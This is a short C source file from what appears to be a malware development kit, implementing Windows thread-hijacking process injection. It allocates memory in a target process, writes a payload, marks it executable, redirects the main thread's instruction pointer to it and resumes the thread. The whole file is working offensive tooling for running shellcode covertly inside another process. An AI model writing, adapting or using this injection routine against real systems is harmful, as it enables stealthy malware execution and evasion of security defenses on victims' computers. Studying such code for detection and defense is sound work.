// MDK
// docs    : https://sebafvs.com/mdk/hijack
// author  : @sebafvs

#include <windows.h>
#include "mdk/execution.h"
#include "mdk/memory.h"
#include "mdk/thread.h"
#include "mdk/nt.h"

MDK_RESULT mdk_thread_hijack(IN PROCESS_INFORMATION pi, IN const BYTE* payload, IN SIZE_T size) {

    // Alloc RW, write payload, flip RX. Same as APC path.
    PVOID remote = NULL;
    MDK_CHECK(mdk_alloc(pi.hProcess, size, PAGE_READWRITE, &remote));

    MDK_RESULT r = mdk_write(pi.hProcess, remote, payload, size);
    if (MDK_FAIL(r)) {
        mdk_free(pi.hProcess, remote);
        return r;
    }

    DWORD old_prot = 0;
    r = mdk_protect(pi.hProcess, remote, size, PAGE_EXECUTE_READ, &old_prot);
    if (MDK_FAIL(r)) {
        mdk_free(pi.hProcess, remote);
        return r;
    }

    // Redirect the main thread's RIP to the payload address.
    r = mdk_set_rip(pi.hThread, remote);
    if (MDK_FAIL(r)) { return r; }

    return mdk_resume_thread(pi.hThread);
}
